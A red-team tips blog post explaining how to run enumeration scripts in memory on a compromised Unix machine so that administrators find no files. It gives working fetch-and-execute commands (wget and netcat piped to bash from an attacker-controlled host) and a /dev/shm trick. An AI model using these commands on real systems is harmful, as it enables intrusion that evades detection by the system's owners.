---
description: >-
  How to execute a downloaded script on a remote machine in memory
title: Execute remote scripts from memory                    # Add title of the machine here
date: 2021-04-29 08:00:00 -0600                           # Change the date to match completion date
categories: [Tips & Tricks]                     # Categories
tags: [hacking, redteam, tips-n-tricks, script, enumeration, linux, macos]     # TAG names should always be lowercase; add relevant tags
show_image_post: true                                    # Change this to true
#image: /assets/img/                # Add image here for post preview image
---

## Execute script in memory

Scenario: You have just gotten a shiny new reverse shell on a Unix-based machine and you want to do some quick enumeration.  You do not want to leave any files on the target system for the system administrators to notice, so you decide to run your enumeration scripts in memory.  How do you do this, you ask?

Popular enumeration scripts:

TODO: add links to LinPEAS,LinEnum, etc.  Or create your own!

## /dev/shm

It is recommended to use the directory `/dev/shm` to avoid writing files to the disk.  This is a virtual directory that only exists in memory.  Any files left behind here will be wiped when the system shuts down or restarts.

```
cd /dev/shm
```

In addition to using the virtual directory `/dev/shm` to write files to, you can also execute scripts in memory directly by using the methods below.

## Using Wget

Using the web-get program `wget` to download a script from an attacker-controlled web server is an excellent way to get remote script execution in memory.  If you do not have a web server to hosts your scripts, you can create one on the fly by using Python3's `http.server` module.

1. First, host the file using a Python HTTP server from your attacking platform of choice (Kali, Parrot, etc) so it is accessible remotely.

```
python3 -m http.server $port
```

You can specify a port by replacing the variable `$port` above.  Note: if you wish to use one of the "well-known" ports such as 80 or 443, you must run the command with `sudo`.  If you leave off the `$port`, it will default to port 8000.

2. Next, you can use the command `wget` to fetch your script from your HTTP server.  By piping this command into `bash` you can execute the script directly from memory.

```
wget -O - http://$attackerIP:$port/$script | bash
```

| Parameter | Description |
| :--- | :--- |
| `-O -` | This parameter tells `wget` to send the contents it downloads to `stdout`. |
| `$attackerIP` | This is your attacking machine's IP (must be reachable from the victim's machine). |
| `$port` | The port you specified on your HTTP server |
| `$script` | This will be the name of the script to fetch from your machine. |

## Using Netcat

This same scenario can also be accomplished by using the popular network transfer tool netcat (`nc`) in the same way you would create a reverse shell. 

1. From your attack platform, start a netcat listener by piping in the contents of your script using `cat`.

```
cat $script | nc -nvlp $port
```

With netcat you must specify a port to listen on.  

2. Next, use netcat on the victim machine to reach back to your attack platform.  When it connects, your computer will send the contents of the script to the victim.  You can execute this in memory by piping this output to `bash`.

```
nc $attackerIP $port | bash
```

## Other Examples

If you have any other examples of methods of executing remote scripts directly in memory, or have any other fun or useful tips or tricks, feel free to contact me on Github at https://github.com/zweilosec or on social media!

If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=zweilosec&button_colour=FFDD00&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=ffffff"></a>

